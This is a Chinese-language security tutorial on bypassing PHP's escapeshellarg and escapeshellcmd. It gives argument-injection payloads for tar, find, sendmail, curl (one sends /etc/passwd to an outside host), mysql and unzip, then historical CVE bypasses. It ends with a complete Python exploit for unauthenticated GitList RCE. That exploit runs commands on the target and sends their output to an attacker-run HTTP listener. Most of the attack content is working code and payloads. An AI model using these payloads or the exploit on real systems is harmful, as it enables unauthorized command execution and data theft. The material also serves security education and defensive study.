# 原创
：  利用/绕过escapeshellarg/escapeshellcmd函数

# 利用/绕过escapeshellarg/escapeshellcmd函数

#### 利用/绕过escapeshellarg/escapeshellcmd

## [1]escapeshellarg和escapeshellcmd的功能

> 
**escapeshellarg:**<br/> (PHP 4 &gt;= 4.0.3, PHP 5, PHP 7)<br/> 把字符串转码为可以在 shell 命令里使用的参数<br/> `string escapeshellarg ( string $arg )`<br/> escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符<br/> **概述：**<br/> 1.确保用户只传递一个参数给命令<br/> 2.用户不能指定更多的参数一个<br/> 3.用户不能执行不同的命令


> 
**escapeshellcmd:**<br/> (PHP 4, PHP 5, PHP 7)<br/> shell 元字符转义<br/> `string escapeshellcmd ( string $command )`<br/> escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义；反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF；’ 和 " 仅在不配对儿的时候被转义；在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替<br/> **概述：**<br/> 1.确保用户只执行一个命令<br/> 2.用户可以指定不限数量的参数<br/> 3.用户不能执行不同的命令


> 
用groups去打印组里每个username成员


```
&lt;?php
	$username = 'h3rmesk1t';
	system('groups '.$username);
?&gt;

=&gt; 
h3rmesk1t : h3rmesk1t adm cdrom sudo dip plugdev lpadmin lxd sambashare

```

> 
但是攻击者可以在username里使用;或者||<br/> 在Linux里，这意味着第二个命令可以在第一个之后被执行


```
&lt;?php
	$username = 'h3rmesk1t;id';
	system('groups '.$username);
?&gt;

=&gt; 
h3rmesk1t : h3rmesk1t adm cdrom sudo dip plugdev lpadmin lxd sambashare
uid=0(root) gid=0(root) groups=0(root)

```

> 
为了防止这一点，我们使用escapeshellcmd<br/> 现在攻击者不能允许第2个命令了


```
&lt;?php
	$username = 'h3rmesk1t;id';
	system(escapeshellcmd('groups '.$username));
?&gt;

=&gt;
groups: ‘h3rmesk1t;id’: no such user

```

> 
这是因为php内部运行了下列命令，以至于myuser;id被当成了一个字符串


```
$ groups myuser;id
groups: „myuser;id”: no such user

```

> 
但是在这种方法中，攻击者可以指定更多参数groups<br/> 例如，一次检测多个用户


```
&lt;?php
	$username = 'h3rmesk1t root';
	system(escapeshellcmd('groups '.$username));
?&gt;

=&gt;
h3rmesk1t : h3rmesk1t adm cdrom sudo dip plugdev lpadmin lxd sambashare
root : root

```

> 
假设我们希望允许每个脚本执行仅检查一个用户


```
&lt;?php
	$username = 'h3rmesk1t root';
	system('groups '.escapeshellarg($username));
?&gt;

=&gt; 
groups: ‘h3rmesk1t root’: no such user

```

> 
这是因为现在$username被视为单个参数：


```
$ groups 'myuser1 myuser2'
groups: "myuser1 myuser2": no such user

```

## [2]已知的绕过/利用

### 参数注入

> 
从上一章可以看到，使用escapeshellcmd / escapeshellarg时不可能执行第二个命令<br/> 但是我们仍然可以将参数传递给第一个命令<br/> 这意味着我们也可以将新选项传递给命令<br/> 利用漏洞的能力取决于目标可执行文件<br/> 可以在下面找到一些已知可执行文件的列表，其中包含一些可能被滥用的特定选项


#### TAR

> 
压缩some_file到/tmp/sth


```
$command = '-cf /tmp/sth /some_file';
system(escapeshellcmd('tar '.$command));

```

> 
创建一个空文件/tmp/exploit


```
$command = "--use-compress-program='touch /tmp/exploit' -cf /tmp/passwd /etc/passwd";
system(escapeshellcmd('tar '.$command));

```

#### FIND

> 
在/Desktop目录下查找1.php


```
&lt;?php
	$command = '1.php';
	system('find ~/Desktop/ -iname '.escapeshellcmd($command));
?&gt;

=&gt; 
/root/Desktop/1.php

```

> 
打印/etc/passwd内容


```
&lt;?php
	$file = "sth -or -exec cat /etc/passwd ; -quit";
	system("find /tmp -iname ".escapeshellcmd($file));
?&gt;

=&gt;
root:x:0:0:root:/root:/bin/bash
......

```

#### Escapeshellcmd和escapeshellarg

> 
在这个配置中，我们可以传递第二个参数给函数。<br/> 列出/tmp目录并忽略sth文件


```
&lt;?php
	$arg = "sth";
	system(escapeshellcmd("ls --ignore=".escapeshellarg($arg).' /tmp'));
?&gt;

```

> 
在/tmp目录中列出文件并忽略sth；使用长列表格式


```
$arg = "sth' -l ";
// ls --ignore='exploit'\'' -l ' /tmp
system(escapeshellcmd("ls --ignore=".escapeshellarg($arg).' /tmp'));

```

> 
WGET，下载example.php


```
$url = 'http://example.com/example.php';
system(escapeshellcmd('wget '.$url));

```

> 
保存.php文件到指定目录


```
$url = '--directory-prefix=/var/www/html http://example.com/example.php';
system(escapeshellcmd('wget '.$url));

```

#### 用.bat执行命令

> 
打印somedir中的文件列表


```
$dir = "somedir";
file_put_contents('out.bat', escapeshellcmd('dir '.$dir));
system('out.bat');

```

> 
并且执行whoami命令


```
$dir = "somedir x1a whoami";
file_put_contents('out.bat', escapeshellcmd('dir '.$dir));
system('out.bat');

```

#### SENDMAIL

> 
发送mail.txt到from@sth.com


```
$from = 'from@sth.com';
system("/usr/sbin/sendmail -t -i -f".escapeshellcmd($from ).' &lt; mail.txt');

```

> 
打印/etc/passwd内容


```
$from = 'from@sth.com -C/etc/passwd -X/tmp/output.txt';
system("/usr/sbin/sendmail -t -i -f".escapeshellcmd($from ).' &lt; mail.txt');

```

#### CURL

> 
下载http://example.com内容


```
$url = 'http://example.com';
system(escapeshellcmd('curl '.$url));

```

> 
发送/etc/passwd内容到http://example.com


```
$url = '-F password=@/etc/passwd http://example.com';
system(escapeshellcmd('curl '.$url));

```

> 
你可以得到文件内容，使用如下payload


```
file_put_contents('passwords.txt', file_get_contents($_FILES['password']['tmp_name']));

```

#### MYSQL

> 
执行sql语句


```
$sql = 'SELECT sth FROM table';
system("mysql -uuser -ppassword -e ".escapeshellarg($sql));

```

> 
运行id命令


```
$sql = '! id';
system("mysql -uuser -ppassword -e ".escapeshellarg($sql));

```

#### UNZIP

> 
从archive.zip解压所有*.tmp文件到/tmp目录


```
$zip_name = 'archive.zip';
system(escapeshellcmd('unzip -j '.$zip_name.' *.txt -d /aa/1'));

```

> 
从archive.zip解压所有*.tmp文件到/var/www/html目录


```
$zip_name = '-d /var/www/html archive.zip';
system('unzip -j '.escapeshellarg($zip_name).' *.tmp -d /tmp');

```

#### 未设置LANG环境变量，则去除非ASCII字符

```
$filename = 'résumé.pdf';
// string(10) "'rsum.pdf'"
var_dump(escapeshellarg($filename));
setlocale(LC_CTYPE, 'en_US.utf8');
//string(14) "'résumé.pdf'" 
var_dump(escapeshellarg($filename));

```

## [3]经典EXP

> 
PHP &lt;= 4.3.6 on Windows – CVE-2004-0542


```
$find = 'word';
system('FIND /C /I '.escapeshellarg($find).' c:\\where\\');

同时运行dir命令

$find = 'word " c:\\where\\ || dir || ';
system('FIND /C /I '.escapeshellarg($find).' c:\where\');

```

> 
PHP 4 &lt;= 4.4.8 and PHP 5 &lt;= 5.2.5 – CVE-2008-2051


```
Shell需要使用GBK，EUC-KR，SJIS等可变宽度字符集的语言环境。

$text = "sth";
system(escapeshellcmd("echo ".$text));
$text = "sth xc0; id";
system(escapeshellcmd("echo ".$text));

或者

$text1 = 'word';
$text2 = 'word2';
system('echo '.escapeshellarg($text1).' '.escapeshellarg($text2));
$text1 = "word xc0";
$text2 = "; id ; #";
system('echo '.escapeshellarg($text1).' '.escapeshellarg($text2));

```

> 
PHP &lt; 5.4.42, 5.5.x before 5.5.26, 5.6.x before 5.6.10 on Windows – CVE-2015-4642


```
额外传递的第三个参数(—param3)

$a = 'param1_value';
$b = 'param2_value';
system('my_command --param1 ' . escapeshellarg($a) . ' --param2 ' . escapeshellarg($b));

$a = 'a\';
$b = 'b -c --param3\';
system('my_command --param1 ' . escapeshellarg($a) . ' --param2 ' . escapeshellarg($b));

```

> 
PHP 7.x before 7.0.2 – CVE-2016-1904


```
如果将1024mb字符串传递给escapeshellarg,则导致缓冲区溢出escapeshellcmd

```

> 
PHP 5.4.x &lt; 5.4.43 / 5.5.x &lt; 5.5.27 / 5.6.x &lt; 5.6.11 on Windows


```
启用EnableDelayedExpansion后，展开一些环境变量。
然后!STH!运行类似于%STH%

escapeshellarg不会过滤!字符
EnableDelayedExpansion以在HKLM或HKCU下的注册表中设置：

[HKEY_CURRENT_USERSoftwareMicrosoftCommand Processor]
"DelayedExpansion"= (REG_DWORD)
1=enabled 0=disabled (default)

例如:

// Leak appdata dir value
$text = '!APPDATA!';
print "echo ".escapeshellarg($text);

```

> 
PHP &lt; 5.6.18


```
功能定义于ext/standard/exec.c，运行类似于(escapeshellcmd，eschapeshellarg，shell_exec)，忽略PHP字符串的长度，并用NULL终止工作代替。

echo escapeshellarg("helloworld");
=&gt;
hello

```

## [4]GitList RCE漏洞利用

> 
文件src/Git/Repository.php


```
public function searchTree($query, $branch)
{
    if (empty($query)) {
        return null;
    }

    $query = escapeshellarg($query);

    try {
        $results = $this-&gt;getClient()-&gt;run($this, "grep -i --line-number {$query} $branch");
    } catch (RuntimeException $e) {
        return false;
    }
}

```

> 
简化后


```
$query = 'sth';
system('git grep -i --line-number '.escapeshellarg($query).' *');

```

> 
当我们查看git grep文档时


```
--open-files-in-pager[=&lt;pager&gt;]
Open the matching files in the pager (not the output of grep). If the pager happens to be "less" or "vi", and the user specified only one pattern, the first file is positioned at the first match automatically.

```

> 
所以基本上–open-files-in-pager就像是在-exec中执行find.


```
$query = '--open-files-in-pager=id;';
system('git grep -i --line-number '.escapeshellarg($query).' *');

```

> 
当我们输入这些进控制台


```
$ git grep -i --line-number '--open-files-in-pager=id;' *
uid=1000(user) gid=1000(user) grupy=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
id;: 1: id;: README.md: not found

```

> 
最后的exp


```
import requests
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import urlparse
import urllib
import threading
import time
import os
import re

url = 'http://192.168.1.1/gitlist/'
command = 'id'
your_ip = '192.168.1.100'
your_port = 8001

print "GitList 0.6 Unauthenticated RCE"
print "by Kacper Szurek"
print "https://security.szurek.pl/"

print "REMEMBER TO DISABLE FIREWALL"

search_url = None
r = requests.get(url)
repos = re.findall(r'/([^/]+)/master/rss', r.text)

if len(repos) == 0:
    print "[-] No repos"
    os._exit(0)

for repo in repos:
    print "[+] Found repo {}".format(repo)
    r = requests.get("{}{}".format(url, repo))
    files = re.findall(r'href="[^"]+blob/master/([^"]+)"', r.text)
    for file in files:
        r = requests.get("{}{}/raw/master/{}".format(url, repo, file))
        print "[+] Found file {}".format(file)
        print r.text[0:100]
        search_url = "{}{}/tree/{}/search".format(url, repo, r.text[0:1])        
        break

if not search_url:
    print "[-] No files in repo"
    os._exit(0)

print "[+] Search using {}".format(search_url)

class GetHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse.urlparse(self.path)
        print "[+] Command response"
        print urllib.unquote_plus(parsed_path.query).decode('utf8')[2:]
        self.send_response(200)
        self.end_headers()
        self.wfile.write("OK")
        os._exit(0)

    def log_message(self, format, *args):
        return

def exploit_server():
    server = HTTPServer((your_ip, your_port), GetHandler)
    server.serve_forever()

print "[+] Start server on {}:{}".format(your_ip, your_port)
t = threading.Thread(target=exploit_server)
t.daemon = True
t.start()
print "[+] Server started"

r  = requests.post(search_url, data={'query':'--open-files-in-pager=php -r "file_get_contents(\"http://{}:{}/?a=\".urlencode(shell_exec(\"{}\")));"'.format(your_ip, your_port, command)})

while True:
    time.sleep(1)

```

[**参考链接**](https://www.anquanke.com/post/id/107336)
